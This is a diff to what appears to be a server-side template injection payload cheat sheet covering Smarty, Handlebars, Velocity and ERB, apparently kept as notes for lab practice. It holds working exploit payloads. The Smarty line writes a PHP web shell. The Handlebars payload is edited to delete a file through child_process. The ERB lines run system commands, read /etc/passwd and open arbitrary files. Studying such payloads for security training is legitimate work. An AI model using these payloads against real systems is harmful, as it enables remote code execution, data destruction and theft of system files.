@@ -61,24 +61,24 @@ Smarty (PHP):
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
 
 Handlebars (NodeJS):
-wrtz{{#with "s" as |string|}}
-{{#with "e"}}
-{{#with split as |conslist|}}
-{{this.pop}}
-{{this.push (lookup string.sub "constructor")}}
-{{this.pop}}
-{{#with string.split as |codelist|}}
-{{this.pop}}
-{{this.push "return require('child_process').exec('whoami');"}}
-{{this.pop}}
-{{#each conslist}}
-{{#with (string.sub.apply 0 codelist)}}
-{{this}}
-{{/with}}
-{{/each}}
-{{/with}}
-{{/with}}
-{{/with}}
+wrtz{{#with "s" as |string|}} 
+	{{#with "e"}} 
+		{{#with split as |conslist|}} 
+			{{this.pop}} 
+			{{this.push (lookup string.sub "constructor")}} 
+			{{this.pop}} 
+				{{#with string.split as |codelist|}} 
+				{{this.pop}} 
+				{{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}} 
+				{{this.pop}} 
+				{{#each conslist}} 
+					{{#with (string.sub.apply 0 codelist)}} 
+						{{this}} 
+					{{/with}} 
+				{{/each}} 
+			{{/with}} 
+		{{/with}} 
+	{{/with}} 
 {{/with}}
 
 Velocity:
@@ -92,6 +92,7 @@ $str.valueOf($chr.toChars($out.read()))
 #end
 
 ERB (Ruby):
+<%= system('cat /etc/passwd') %>
 <%= system("whoami") %>
 <%= Dir.entries('/') %>
 <%= File.open('/example/arbitrary-file').read %>
